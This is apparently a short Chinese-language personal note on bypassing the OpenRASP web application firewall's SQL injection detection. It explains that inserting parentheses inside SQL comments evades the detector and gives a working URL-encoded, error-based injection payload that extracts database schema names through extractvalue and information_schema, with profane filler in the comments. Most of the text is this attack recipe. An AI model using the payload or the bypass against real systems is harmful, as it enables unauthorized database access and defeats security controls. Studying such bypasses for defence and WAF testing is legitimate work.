# 绕waf记录

## 绕过OpenRASP sql注入检测

OpenRASP 检测sql注入好像特别喜欢匹配括号，那么我们就在注释中弄个括号即可绕过

成功绕过的例子:

sql语句:`select * from xa_user_c where RegEmail='输入点'`

```php
Email=crawlergo%40gmail.cn'-extractvalue/*fffucker tou c/*hao f/*uck/*er /*ssss*/%0a%00/*(*/(1,concat/*(*/('~',(SELECT/*(*/schema_name/*(*/FROM/*(*/information_schema.schemata+limit+1,1)))-'
```

